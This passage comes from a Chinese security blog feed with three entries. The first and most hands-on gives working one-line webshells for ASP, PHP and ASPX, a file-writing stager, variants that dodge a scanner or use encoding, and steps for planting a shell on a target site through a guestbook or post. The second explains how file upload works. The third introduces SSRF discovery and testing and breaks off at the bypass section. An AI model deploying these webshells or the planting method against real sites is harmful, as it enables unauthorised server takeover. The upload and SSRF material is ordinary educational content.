request(“value”)%&gt;这句,那么这句代码就会执行我们从表单里传来的内容哦.(表单名必须和&lt;%execute request(“value”)%&gt;里的VALUE一样,就是我用蓝色标记的那两处,必须相等)</p><p>说到这里大家是不是清楚了.我们构造了两个表单,第一个表单里的代码是文件操作的代码(就是把第二个表单内的内容写入在当前目录下并命名为newvalue.ASP的这么一段操作的处理代码)那么第二个表单当然就是我们要写入的马了.</p><p>具体的就是下面这一段:</p><pre><code>set lP=server.createObject(&quot;Adodb.Stream&quot;)//建立流对象lP.Open //打开lP.Type=2 //以文本方式lP.CharSet=&quot;gb2312&quot; //字体标准lP.writetext request(&quot;newvalue&quot;)lP.SaveToFile server.mappath(&quot;newvalue.asp&quot;),2 //将木马内容以覆盖文件的方式写入newmm.asp，2就是已覆 盖的方式lP.Close //关闭对象set lP=nothing //释放对象response.redirect &quot;newmm.asp&quot; //转向newmm.asp</code></pre><p>这样的话第二个表单的名字必须和lP.writetext request(“newvalue”) 里的Newvalue一样,就是我用红色标注的那两处.<br>至此只要服务器有写的权限你表单所提交的大马内容就会被写入到newmm.asp中。即newmm.asp为我们的shell地址。</p><h3 id="常用写法："><a href="#常用写法：" class="headerlink" title="常用写法："></a>常用写法：</h3><p>asp一句话木马：&lt;%execute(request(“value”))%&gt;<br>php一句话木马：<?php @eval($_POST[value]);?><br>aspx一句话木马：<br>　　&lt;%@ Page Language=”Jscript”%&gt;<br>　　&lt;%eval(Request.Item[“value”])%&gt;<br>其他一句话木马：</p><pre><code>&lt;%eval request(&quot;value&quot;)%&gt;　　&lt;%execute request(&quot;value&quot;)%&gt;　　&lt;%execute(request(&quot;value&quot;))%&gt;　　&lt;%If Request(&quot;value&quot;)&lt;&gt;&quot;&quot; Then Execute(Request(&quot;value&quot;))%&gt;　　&lt;%if request (&quot;value&quot;)&lt;&gt;&quot;&quot;then session(&quot;value&quot;)=request(&quot;value&quot;):end if:if session(&quot;value&quot;)&lt;&gt;&quot;&quot; then execute session(&quot;value&quot;)%&gt;　　&lt;SCRIPT language=VBScript runat=&quot;server&quot;&gt;execute request(&quot;value&quot;)&lt;/SCRIPT&gt;　　&lt;%@ Page Language=&quot;Jscript&quot;%&gt;　　&lt;%eval(Request.Item[&quot;value&quot;],&quot;unsafe&quot;);%&gt; </code></pre><p>可以躲过雷客图的一句话木马：</p><pre><code>　　&lt;%　　set ms = server.CreateObject(&quot;MSScriptControl.ScriptControl.1&quot;)　　ms.Language=&quot;VBScript&quot;　　ms.AddObject &quot;Response&quot;, Response　　ms.AddObject &quot;request&quot;, request　　ms.ExecuteStatement(&quot;ev&quot;&amp;&quot;al(request(&quot;&quot;value&quot;&quot;))&quot;)　　%&gt;</code></pre><p>不用’&lt;,&gt;’的asp一句话木马：</p><p>　　<script language="VBScript" runat="server">execute request("value")</script><br>不用双引号的一句话木马：&lt;%eval request(chr(35))%&gt;<br>UTF-7编码加密:<br>&lt;%@ codepage=65000%&gt;&lt;% response.Charset=”936″%&gt;&lt;%e+j-x+j-e+j-c+j-u+j-t+j-e+j-(+j-r+j-e+j-q+j-u+j-e+j-s+j-t+j-(+j-+ACI-#+ACI)+j-)+j-%&gt;</p><h3 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h3><p>首先,找到数据库是asp格式的网站,然后,以留言板,或者发表文章的方式,把一句话添加到asp数据库，或者加进asp网页.<br>记住!我们的目的是把一句话&lt;%execute request(“value”)%&gt;添加到数据库,无论任何方式!<br>然后打开客户端(就是你电脑上面的那个htm文件),填上加入了一句话的asp文件,或者是asp网页,然后进入此网站服务器。</p><h3 id="使用环境："><a href="#使用环境：" class="headerlink" title="使用环境："></a>使用环境：</h3><p>1.服务器的来宾账户有写入权限<br>2.已知数据库地址且数据库格式为asa或asp<br>3.在数据库格式不为asp或asa的情况下，如果能将一句话插入到asp文件中.</p><p><a href="https://www.cnblogs.com/milantgh/p/3629199.html" target="_blank" rel="noopener">参考博客</a></p><p><a href="https://baike.baidu.com/item/一句话木马/1845646?fr=aladdin" target="_blank" rel="noopener">参考网址</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;一句话木马的原理及利用&quot;&gt;&lt;a href=&quot;#一句话木马的原理及利用&quot; class=&quot;headerlink&quot; title=&quot;一句话木马的原理及利用&quot;&gt;&lt;/a&gt;一句话木马的原理及利用&lt;/h1&gt;&lt;h3 id=&quot;一句话木马的举例说明：&quot;&gt;&lt;a href=&quot;#一句话木马的
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>文件上传原理</title>
    <link href="http://yoursite.com/2020/05/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86/"/>
    <id>http://yoursite.com/2020/05/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86/</id>
    <published>2020-05-14T12:38:51.321Z</published>
    <updated>2020-05-13T12:47:43.850Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件上传原理"><a href="#文件上传原理" class="headerlink" title="文件上传原理"></a>文件上传原理</h1><p>文件上传：因为浏览器本身的限制，浏览器是不能直接操作文件系统的，需要通过浏览器所暴露出来的统一接口，由用户主动授权发起来访问文件动作，然后读取文件内容进指定内存里，最后执行提交请求操作，将内存里的文件内容数据上传到服务端，最后服务端解析前端传来的数据信息后存入文件里。</p><h4 id="PHP文件上传原理：参考博客"><a href="#PHP文件上传原理：参考博客" class="headerlink" title="PHP文件上传原理：参考博客"></a>PHP文件上传原理：<a href="https://www.cnblogs.com/promiseslc/p/8365986.html" target="_blank" rel="noopener">参考博客</a></h4><p>1、文件上传原理</p><p>　　将客户端的文件上传到服务器，再将服务器的临时文件上传到指定目录</p><p>2、客户端配置</p><ul><li>提交表单</li><li>表单的发送方式为post</li><li>添加enctype=”multipart/form-data”</li></ul><p>3、服务器端配置</p><ul><li>file_uploads = On，支持HTTP上传</li><li>uoload_tmp_dir = ，临时文件保存目录</li><li>upload_max_filesize = 2M，允许上传文件的最大值</li><li>max_file_uploads = 20 ，允许一次上传到的最大文件数</li><li>post_max_size = 8M，post方式发送数据的最大值</li><li>max_execution_time = -1，设置了脚本被解析器终止之前允许的最大执行时间，单位为秒，防止程序写的不好而占尽服务器资源。-1代表无穷</li><li>max_input_time = 60 ，脚本解析输入数据允许的最大时间，单位为秒</li><li>max_input_nesting_level = 64 ，设置输入变量的嵌套深度</li><li>max_input_vars_ = 1000，接受多少输入的变量（限制分别应用于$_GET、$_POST和$_COOKIE超全局变量，将会导致E_WARNING的产生，更多的输入变量将会从请求中截断。</li><li>memory_limit = 128M，最大单线程的独立内存使用量。也就是一个web请求，给予线程最大的内存使用量的定义</li></ul><p>4、错误信息说明</p><p>1）UPLOAD_ERR_OK：其值为0，没有错误发生，文件上传成功</p><p>2）UPLOAD_ERR_INI_SIZE：其值为1，上传的文件超过了php.ini中upload_max_filesize选项限制的值</p><p>3）UPLOAD_ERR_FORM_SIZE：其值为2，上传文件的大小超过了HTML表单中MAX_FILE_SIZE选项指定的值</p><p>4）UPLOAD_ERR_PARTIAL：其值为3，文件只有部分被上传</p><p>5）UPLOAD_ERR_NO_FILE：其值为4，没有文件被上传</p><p>6）UPLOAD_ERR_NO_TMP_DIR：其值为6，找不到临时文件夹</p><p>7）UPLOAD_ERR_CANT_WRITE：其值为7，文件写入失败</p><p>8）UPLOAD_ERR_EXTENSION：其值为8，上传的文件被PHP扩展程序中断</p><p>5、客户端限制</p><ul><li><p>通过表单隐藏域限制文件上传文件的最大值</p><pre><code>&lt;input type=&#39;hidden&#39; name=&#39;MAX_FILE_SIZE&#39; VALUE=&#39;字节数&#39; /&gt;</code></pre></li><li><p>通过accept属性限制上传文件类型</p><pre><code>&lt;input type=&#39;file&#39; name=&#39;myFile&#39; accept=&#39;文件的MIME类型&#39; /&gt;</code></pre></li></ul><p>6、在客户端的限制，用户可在网页上修改代码后上传，故无实际意义。应在服务器端加以限制</p><p>1）限制上传文件的大小</p><p>2）限制上传文件类型</p><p>3）检测是否为真实图片类型</p><p>4）检测是否为HTTP POST方式上传</p><h4 id="HTTP文件上传的基本原理："><a href="#HTTP文件上传的基本原理：" class="headerlink" title="HTTP文件上传的基本原理："></a>HTTP文件上传的基本原理：</h4><p>使用html 的<input type="file" name="xxx"> 标签，提交form 的几个属性必须为： method=post  encType=multipart/form-data;<br>method 属性必须设为post的原因是：值不是放在URL之后传递到服务器的；<br>encType属性：这个属性管理的是表单的MIME编码<br>几个属性详解：<br>         application/x-www-form-urlencoded   在发送前编码所有字符（默认）<br>       multipart/form-data  不对字符编码，在使用包含文件上传控件的表单时，必须使用该值；对于“multipart/form-data”类型的form表单，浏览器上传的实体内 容中的每个表单字段元素的数据之间用字段分隔界线进行分割，两个分隔界线间的内容称为一个分区，每个分区中的内容可以被看作两部分，一部分是对表单字段元 素进行描述的描述头，另外一部是表单字段元素的主体内容<br>       text/plain 空格转换为“+”，不对特殊字符编码</p><p>归纳的三个重要点：</p><p>1.提交方式必须为post；<br>2.表单中有文件上传的表单项必须为<input type="file">；<br>3.必须指定表单类型enctype=”multipart/form-data”。</p><p>例子（代码）：</p><pre><code>&lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;      &lt;input type=&quot;file&quot; name=&quot;file&quot; value=&quot;请选择文件&quot;&gt;&lt;br /&gt;      &lt;input type=&quot;submit&quot;&gt;    &lt;/form&gt;</code></pre><h5 id="服务器端："><a href="#服务器端：" class="headerlink" title="服务器端："></a>服务器端：</h5><p>​       WEB服务器端程序接收到“multipart/form-data”类型的HTTP请求消息后，其核心和基本的编程工作就是读取请求消息中的实体内容，然后解析出每个分区的数据，接着再从每个分区中解析出描述头和主体内容部分。<br>​       要在jsp里获得上传的文件，就是通过request.getInputStream()来得到上传的整个post实体的流，用 request.getHeader(“Content-Type”)来取得实体内容的分界字符串，然后根据http协议，分析取得的上传的实体流，把文 件部分给筛出来，然后在服务器端保存到磁盘文件中，另外因为上传文件时，form的属性enctype=”multipart/form-data”，所 以其他表单参数在上传文件时也无法得到，除了筛出文件进行保存，还应该把其他的参数一起取出保存，以便在jsp程序中调用。</p><p>具体方法如下：<br>1、 根据request获得文件输入流；<br>2、 依次读取行，此时进行两部分内容的处理，<br>  a:获取文件名<br>  以 filename=”xxxxx”来标识一个文件头，<br>  b:获取其他表单值（因为其流是按照multipart/form-data方式来编码的，所以在服务器端，不能     直接用request.getParameter()来获得）<br>    以name=”xxxx”来标识一个表单头，</p><p>​    都以流头的字符标识为值的结束；</p><p>实体内容内部的字段分隔界线是在content-type头中指定的字段分隔界线前面增加了两个减号（-）字符而形成的（由浏览器随机生成，由浏览器 保证不会与用户上传的文件内容重复）<br>当找到一个分区的开始位置后，程序还需要分辨出分区中的描述头和主体内容，并对这两部分内容分开存储。如何分辨出一个分区的描述头和主体部分呢？每 个分区中的描述头和主体内容之间有一空行，再加上描述头后面的换行，这就说明描述头和主体部分之间是使用“\n”、“\r”、“\n”、“\r”这四个连 续的字节内容进行分隔。因此，程序需要把“\n”、“\r”、“\n”、“\r”这四个连续的字节内容作为描述头和主体部分之间的分隔界线，并在字节数组 缓冲区buffer中寻找这个特殊的分隔界线来识别描述头和主体部分。</p><p>3、 根据读到的文件信息（文件名，文件大小等），判断是否合法（文件类型、文件大小判断）。如果合适则返回，如果不合适则创建同名文件并将其删除；</p><p>演示Form 显示提交的流的格式：  UI </p><p>当前的主流文件上传组件性能对比<br>    1、smartUpload          2、FileUpload           3、Cos<br>实例演示性能对比：<br>jspSmartUpload<br>fileUpLoad<br>cos<br>20M 、75M 、300M</p><p>所以选择Cos作为内部读取解析文件流的组件；<br><strong>使用组件而不是自己来解析文件流的原因：</strong><br>1、 读取文件大小的限制，如同smartUpload 组件一样，上传的文件大小会受到JVM内存容量的限制，因为读取的文件流都是存储在内存之中的，而fileUpLoad和cos采用的是当文件读取到了一定的大小就先写到硬盘上的临时目录中；</p><p>2、 读取效率的限制 ，组件可以根据文件的大小设定一定的缓存，来提升读取的效率，分配好内存的缓存大小，及硬盘目录缓存大小；<br>（文件缓存循环机制作的简要介绍，缓冲区如何正好读取到分区界限）</p><p><strong>此类组件的使用及封装方式：</strong><br>MultipartRequest mu = new MultipartRequest(HttpServletRequest request,Directory,MaxSize,”gbk”);</p><p>我们只需要传递一个申请的request流，目录名，它会自动完成相应的解析文件流的过程，然后直接在对应设置的目录中生成对应的同名文件；<br>代理模式：</p><pre><code>HttpServerRequestProxy：代理表单请求InputStreamRequestProxy：代理输入流</code></pre><p>整个的代理流程如下：<br>首先类HttpServerRequestProxy 继承于HttpServletRequestWrapper，并覆写它父类的getInputStream() 方法，在这个方法中我们设置它返回InputStreamRequestProxy流对象（当然这个类必须要与ServletInputstream 兼容，所以它必定继承于ServletInputstream），然后我们覆写这个流的read()方法，并在这个方法内部我们对文件上传的进度，速度进 行控制，而不是由组件提供的特定的进度监视器来获取准确的精度；</p><p>运行流程如下：<br>    组件以HttpServerRequestProxy对象为参数进行初始化，在其内部再调用参数的getInputStream()方法获取整个传入流，再使用流的read()方法读取实际内容，这样整个处理流的过程，都是从代理中通过的；</p><h5 id="服务器端获取文件传输速度的计算方式："><a href="#服务器端获取文件传输速度的计算方式：" class="headerlink" title="服务器端获取文件传输速度的计算方式："></a>服务器端获取文件传输速度的计算方式：</h5><ol><li>根据前后读取buffer的时间来测算，但是由于读取request 返回的流太过频繁，导致以毫秒计算，根本没有办法来计算实时速度；（不可行）</li><li>采用一个控制量，固定读取一定数量的buffer后，再根据服务器读取这段的长度所使用的时间来设定速度值；（需要设定BufferNUM的值，实时性较好，资源消耗最少）；</li><li>采用定时器，每过N秒访问一次文件读取的进度，设置相关的信息，但返回的上传速度可能为 0，或者是无穷；</li></ol><h5 id="判断上传文件（单个）大小是否符合服务器设置："><a href="#判断上传文件（单个）大小是否符合服务器设置：" class="headerlink" title="判断上传文件（单个）大小是否符合服务器设置："></a>判断上传文件（单个）大小是否符合服务器设置：</h5><p>（如何快速判断，而不是等二进制流读取完再返回错误信息。）<br>javaScript 客户端脚本判断，但是针对不同的浏览器，不同的权限设置，不一定能成功；（且于服务器端实际读取的文件大小精度有差异，难以靠以上传的流的大小来保证文件是否已经上传完毕）<br>function ShowFileSize()<br>{<br>            var fso = new ActiveXObject(“Scripting.FileSystemObject”);<br>        var f, s, file;<br>        if (“object” != typeof(fso))<br>            return;<br>        file = FormName.fileName.value;<br>        f = fso.GetFile(file);<br>        alert(f.size);<br>}</p><p>服务器即时判断：服务器读取流，直到读取的流的数量大于所设定大的限制，则返回错误信息。（占太多的时间，且浪费服务器资源）<br>服务器端判断：在发送POST请求时，信息头里面都包含 Content-Length 属性，其代表着整个请求的数据长度。我们可以通过简单的判断这个Header数据，发现超过了我们允许的长度则直接断开连接，这样就不会对服务器造成资源浪费。<br>演示：simpleFileUpload   index.jsp</p><h5 id="如何判断批量上传的每一个文件的大小："><a href="#如何判断批量上传的每一个文件的大小：" class="headerlink" title="如何判断批量上传的每一个文件的大小："></a>如何判断批量上传的每一个文件的大小：</h5><p>（使用方法二）<br>1． 在客户端判断文件大小，只提交服务器一个文件流，但是文件大小的精确程度会有一定程度的不同，导致一种假死现象；还会有客户端js代码的权限问题。</p><p>2． 在服务器端判断文件大小，但是服务器在真实读取文件流之前 ，使用上面的方法二，只能得到整个流的大小，不能得到，单个文件的大小；这样只能实现整个上传进度的统计。而不可能实现多个文件分开计算其精度的方法；<br>演示：simpleFileUpload   pLOneStream.jsp</p><p>3．每个文件提交一个文件流，服务器对每个流处理时返回文件大小及文件进度。方法是，每个 <input type="”file”"> 标签都置于一个独立的form表单中，然后一次提交；</p><h5 id="服务器如何在真正文件上传-读取流-之前获得文件名？"><a href="#服务器如何在真正文件上传-读取流-之前获得文件名？" class="headerlink" title="服务器如何在真正文件上传(读取流)之前获得文件名？"></a>服务器如何在真正文件上传(读取流)之前获得文件名？</h5><p>​    按照正常的Http上传文件的方式是不能实现的，只有在客户端向服务器提交表单之前先向服务器提交一个Ajax请求，然后服务器调用Ajax请求传递过来 的参数（文件名）来判断是否符合服务器提交要求，如果符合则在客户端的回调函数中提交本文件所属的form表单；如果不符合则返回出错信息；</p><p>如果文件不合法，服务器、客户端如何而实现：<br>（此时服务器已经必定在读http传递过来的文件流，除非判断文件名是在客户端判断，或者是使用Ajax在服务器端判断的方法）<br>1、 客户端使用Ajax 接受服务器返回出错信息，并在服务器内部读取流文件时，如果发现文件不合法则抛出特定的异常，并在服务器内部自行捕获处理；<br>2、 流覆盖；<br>流覆盖演示：streamCover<br>原理：将两个请求同时提交到一个地方，导致后面的流截断前面正在上传的文件流，从而达到删除正在上传的文件的效果；（删除正在上传的文件）</p><h5 id="客户端从服务器读取文件上传进度信息："><a href="#客户端从服务器读取文件上传进度信息：" class="headerlink" title="客户端从服务器读取文件上传进度信息："></a>客户端从服务器读取文件上传进度信息：</h5><h5 id="Ajax"><a href="#Ajax" class="headerlink" title="(Ajax)"></a>(Ajax)</h5><p><strong>几个重要的步骤：</strong><br>1、  构建Ajax 对象；（需要针对不同的浏览器进行构建），参见代码；cosex—UpLoadFile.html—getAjax；<br>2、  设置回调函数 onreadystatechange;<br>3、  设置携带特定参数信息的URL；<br>4、  发送请求；<br>5、  等待回调；</p><p><strong>需要注意的问题：</strong><br>1、  IE缓存问题；<br>解决方法：<br>清除由于IE缓存造成的Ajax不能多次发出请求：<br>服务器端：<br>response.setHeader(“Cache-Control”,”no-cache”);<br>客户端<br> 在Ajax发出的请求URL后添加一个随机数（Math.random()），这样对于IE来说每次请求的页面都不是同一个页面就不会造成直接调用缓存页面的问题；</p><p>2、  同步还是异步请求的问题；<br>Ajax的优势就是可以异步发送请求到服务器，而不需要服务器实时的去相应，所以设为异步；</p><p><strong>服务器端相应Ajax请求的几个问题：</strong><br>1、  Ajax异步请求与传统请求在服务器端的判断方法；<br>request.getHeader(“x-requested-with”);<br>b．在URL后添加一个与服务器端约定好的参数；<br>（在服务器端都必须显示的去判断）<br>2、  字符编码问题；<br>Ajax请求默认的参数默认均为 ”ISO8859-1”，在服务器端必须要进行解码；</p><p><strong>与进度条的集成：</strong><br>根据Ajax从服务器获取的文件信息（文件大小，上传速度，上传百分比等信息），信息每更新一次就设定进度条的值；动态隐藏和显示显示进度条的div；</p><p><strong>UI上传组件应该具备以下基本功能：</strong></p><ol><li>能让用户提供一个上传路径</li><li>能够限制上载文件的大小（防止上传文件过大）<ol start="3"><li>能够支持多个文件同时上传及限制并行上传文件的个数（多文件并行上传）</li><li>可以在服务器端进行异常错误捕获，并进行适当的处理</li><li>上传组件的稳定性（上传速度能够保持稳定）</li></ol></li><li>可以设定屏蔽（或指定）固定类型的文件（如以 .exe结尾的文件等）</li><li>能够向用户提供一个友好的交互界面，实时显示该文件上传的进度、当前用户的网络状态、上传此文件已花费时间、传输速率，剩余时间等信息</li><li>支持对已上传或正在上传文件的删除</li><li>用户使用及操作及可扩展 ，并能够灵活的集成到其它项目中</li></ol><pre><code>     Ajax的同步问题 ；（两个不同的页面同时访问一个服务端URL，导致两者得到的值竟然是后者的值）</code></pre><p>一个页面的，多表单提交的问题解决方案：<br>1．  使用Ajax 实现。<br>2．  使用 form 的target 属性提交到一个本页面的iframe 的name 上，那样页面就不会跳转。</p><p>Javascript问题：<br>引号中传字符串值； 可以单双引号嵌套使用<br>Setinterval（）函数传值，采用<br>function(){ realFunction(args)} 的匿名传值方法；<br>3．  取消计时器clearInterval(timerID);</p><p>一个页面多次提交导致流被截断；<br>       如果是提交到一个隐藏的frame中的话，那么会导致流被截断，必须提交到不同的隐藏frame中，才可以异步提交到服务器。</p><p><a href="http://blog.sina.com.cn/s/blog_8f32dc250100wva8.html" target="_blank" rel="noopener">转载来源博客</a></p><p><a href="https://blog.csdn.net/qq_27053493/java/article/details/100589143" target="_blank" rel="noopener">参考博客</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件上传原理&quot;&gt;&lt;a href=&quot;#文件上传原理&quot; class=&quot;headerlink&quot; title=&quot;文件上传原理&quot;&gt;&lt;/a&gt;文件上传原理&lt;/h1&gt;&lt;p&gt;文件上传：因为浏览器本身的限制，浏览器是不能直接操作文件系统的，需要通过浏览器所暴露出来的统一接口，由用户主
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>什么是SSRF？</title>
    <link href="http://yoursite.com/2020/05/14/%E4%BB%80%E4%B9%88%E6%98%AFSSRF%EF%BC%9F/"/>
    <id>http://yoursite.com/2020/05/14/%E4%BB%80%E4%B9%88%E6%98%AFSSRF%EF%BC%9F/</id>
    <published>2020-05-14T12:38:40.833Z</published>
    <updated>2020-05-10T06:06:40.417Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SSRF漏洞学习"><a href="#SSRF漏洞学习" class="headerlink" title="SSRF漏洞学习"></a>SSRF漏洞学习</h1><h2 id="什么是SSRF？"><a href="#什么是SSRF？" class="headerlink" title="什么是SSRF？"></a>什么是SSRF？</h2><p>SSRF漏洞寻找内网入口，是突破内网的一个方法。<br>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。</p><p>SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><h5 id="（服务端跟客户端的区别："><a href="#（服务端跟客户端的区别：" class="headerlink" title="（服务端跟客户端的区别："></a>（服务端跟客户端的区别：</h5><p>服务端是一种有针对性的服务程序。它的主要表现形式以“windows窗口程序”与“控制台”为主。一般大型的服务端都是在Linux环境下搭建。运行服务端的电脑称之为“服务器”。</p><p>客户端与服务端：服务端，是为客户端服务的。服务的内容诸如向客户端提供资源，保存客户端数据；客户端就是我们使用的电脑（包括我们使用的浏览器IE,Firefox）；服务器端就是存放网页与数据库数据的服务器。</p><p>通俗一点讲：服务端应该是服务器端，就是都访问它，它共享数据大家来用，它就是服务器端，每个访问服务器端的都是客户端！</p><p>或者也可以这样说：服务器端是远程服务器，运行结果是由服务器产生的；客户端就是网友的电脑。所有的动态网页都是在服务器端执行的，例如ASP、PHP、JSP；所有的静态网页都是在客户端执行的，例如JavaScript、Flash都是属于静态网页。 </p><p>举例：例如你使用JavaScript写了e799bee5baa6e58685e5aeb931333264656666一个显示日期的程序，它显示的只是客户端的系统日期，如果你修改了你的电脑的系统日期，那么这个JavaScript程序的运行结果也会变。<br>而如果使用ASP编写了显示日期的程序，如 &lt;%=date%&gt; ，显示的则是服务器的日期。如果你修改了你的电脑的系统日期，这个显示结果是不会变的 。</p><h5 id="参考网址1-参考网址2-）"><a href="#参考网址1-参考网址2-）" class="headerlink" title="参考网址1  参考网址2  ）"></a><a href="https://zhidao.baidu.com/question/337589385.html?sort=11&rn=5&pn=5" target="_blank" rel="noopener">参考网址1</a>  <a href="https://baike.baidu.com/item/服务端/6492316?fr=aladdin" target="_blank" rel="noopener">参考网址2</a>  ）</h5><h2 id="SSRF漏洞的寻找"><a href="#SSRF漏洞的寻找" class="headerlink" title="SSRF漏洞的寻找"></a>SSRF漏洞的寻找</h2><h4 id="一、从WEB功能上寻找"><a href="#一、从WEB功能上寻找" class="headerlink" title="一、从WEB功能上寻找"></a>一、从WEB功能上寻找</h4><p>我们从上面的概述可以看出，SSRF是由于服务端获取其他服务器的相关信息的功能中形成的，因此我们大可以列举几种在web 应用中常见的从服务端获取其他服务器信息的的功能。<br>1）分享：通过URL地址分享网页内容<br>早期分享应用中，为了更好的提供用户体验，WEB应用在分享功能中，通常会获取目标URL地址网页内容中的<tilte>标签或者<meta name="description" content>标签中content的文本内容作为显示以提供更好的用户体验。</tilte></p><p><img src="https://img-blog.csdnimg.cn/20190704195033842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM3MTMzNzE3,size_16,color_FFFFFF,t_70" alt></p><p>2）转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p><p>3）在线翻译：通过URL地址翻译对应文本的内容。提供此功能的国内公司有百度、有道等</p><p>4）图片加载与下载：通过URL地址加载或下载图片<br>图片加载远程图片地址此功能用到的地方很多，但大多都是比较隐秘，比如在有些公司中的加载自家图片服务器上的图片用于展示。（此处可能会有人有疑问，为什么加载图片服务器上的图片也会有问题，直接使用img标签不就好了？ ，没错是这样，但是开发者为了有更好的用户体验通常对图片做些微小调整例如加水印、压缩等，所以就可能造成SSRF问题）。</p><p>5）图片、文章收藏功能<br>此处的图片、文章收藏中的文章收藏就类似于功能一、分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于功能四、图片加载。<br>6）未公开的api实现以及其他调用URL的功能<br>此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</p><p>（备注：API，即应用程序编程接口。<br>说得更加通俗易懂一些，别人写好的代码，或者编译好的程序，提供给你使用，就叫做API。你使用了别人代码（或者程序）中的某个函数、类、对象，就叫做使用了某个API。<a href="baijiahao.baidu.com/s?id=1586026960877760125&wfr=spider&for=pc">参考博客</a>）</p><h4 id="二、从URL关键字中寻找"><a href="#二、从URL关键字中寻找" class="headerlink" title="二、从URL关键字中寻找"></a>二、从URL关键字中寻找</h4><p>在对功能上存在SSRF漏洞中URL地址特征的观察，通过我一段时间的收集，大致有以下关键字:</p><p>share<br>wap<br>url<br>link<br>src<br>source<br>target<br>u<br>3g<br>display<br>sourceURl<br>imageURL<br>domain<br>…</p><p>如果利用google 语法加上这些关键字去寻找SSRF漏洞，耐心的验证，现在还是可以找到存在的SSRF漏洞。</p><h2 id="SSRF-漏洞的验证"><a href="#SSRF-漏洞的验证" class="headerlink" title="SSRF 漏洞的验证"></a>SSRF 漏洞的验证</h2><h4 id="1）基本判断（排除法）"><a href="#1）基本判断（排除法）" class="headerlink" title="1）基本判断（排除法）"></a>1）基本判断（排除法）</h4><p>例如： 这样的代码</p><pre><code>http://www.douban.com/***/service?image=http://www.baidu.com/img/bd_logo1.png</code></pre><p>排除法一：<br>你可以直接右键图片，在新窗口打开图片，如果是浏览器上URL地址栏是<code>http://www.baidu.com/img/bd_logo1.png</code>，说明不存在SSRF漏洞。<br>排除法二：<br>你可以使用burpsuite等抓包工具来判断是否不是SSRF，首先SSRF是由服务端发起的请求，因此在加载图片的时候，是由服务端发起的，所以在我们本地浏览器的请求中就不应该存在图片的请求，在此例子中，如果刷新当前页面，有如下请求，则可判断不是SSRF。（前提设置burpsuite截断图片的请求，默认是放行的）</p><p><a href="http://p9.qhimg.com/t01554ac9cba1ae96e9.png" target="_blank" rel="noopener"><img src="http://p9.qhimg.com/t01554ac9cba1ae96e9.png" alt="img"></a></p><p><strong>问题1：如何设置burpsuite截断图片请求？是Intercept Client Requests：设置过滤客户端请求；Intercept Server Response：设置过滤服务端响应；这两个按钮？</strong></p><p><strong>答：</strong></p><p>为什么这边用排除法来判断是否存在SSRF，举例如下：</p><p><a href="http://p2.qhimg.com/t01080058bb303b1e6f.png" target="_blank" rel="noopener"><img src="http://p2.qhimg.com/t01080058bb303b1e6f.png" alt="img"></a></p><pre><code>http://read.*******.com/image?imageUrl=http://www.baidu.com/img/bd_logo1.png</code></pre><p>现在大多数修复SSRF的方法基本都是区分内外网来做限制（暂不考虑利用此问题来发起请求，攻击其他网站，从而隐藏攻击者IP，防止此问题就要做请求的地址的白名单了），如果我们请求 ：</p><pre><code>http:``//read.******.com/image?imageUrl=http://10.10.10.1/favicon.ico</code></pre><p>而没有内容显示，我们是判断这个点不存在SSRF漏洞，还是<code>http://10.10.10.1/favicon.ico</code>这个地址被过滤了，还是<code>http://10.10.10.1/favicon.ico</code>这个地址的图片文件不存在，如果我们事先不知道<code>http://10.10.10.1/favicon.ico</code>这个地址的文件是否存在的时候是判断不出来是哪个原因的，所以我们采用排除法。</p><h4 id="2）实例验证"><a href="#2）实例验证" class="headerlink" title="2）实例验证"></a>2）实例验证</h4><p>经过简单的排除验证之后，我们就要验证看看此URL是否可以来请求对应的内网地址。在此例子中，首先我们要获取内网存在HTTP服务且存在favicon.ico文件的地址，才能验证是否是SSRF漏洞。<br>找存在HTTP服务的内网地址：<br>一、从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址<br>二、通过二级域名暴力猜解工具模糊猜测内网地址</p><p><a href="http://p0.qhimg.com/t01111bbf7ba9e818bc.png" target="_blank" rel="noopener"><img src="http://p0.qhimg.com/t01111bbf7ba9e818bc.png" alt="img"></a></p><pre><code>example:ping xx.xx.com.cn</code></pre><p>可以推测10.215.x.x 此段就有很大的可能： <code>http://10.215.x.x/favicon.ico</code> 存在。</p><p>在举一个特殊的例子来说明：</p><pre><code>http://fanyi.baidu.com/transpage?query=http://www.baidu.com/s?wd=ip&amp;source=url&amp;ie=utf8&amp;from=auto&amp;to=zh&amp;render=1</code></pre><p><a href="http://p7.qhimg.com/t01365be44f183f878d.png" target="_blank" rel="noopener"><img src="http://p7.qhimg.com/t01365be44f183f878d.png" alt="img"></a></p><p>此处得到的IP 不是我所在地址使用的IP，因此可以判断此处是由服务器发起的<code>http://www.baidu.com/s?wd=ip</code> 请求得到的地址，自然是内部逻辑中发起请求的服务器的外网地址（为什么这么说呢，因为发起的请求的不一定是fanyi.baidu.com，而是内部其他服务器）,那么此处是不是SSRF，能形成危害吗？  严格来说此处是SSRF，但是百度已经做过了过滤处理，因此形成不了探测内网的危害。</p><h2 id="SSRF-漏洞中URL地址过滤的绕过"><a 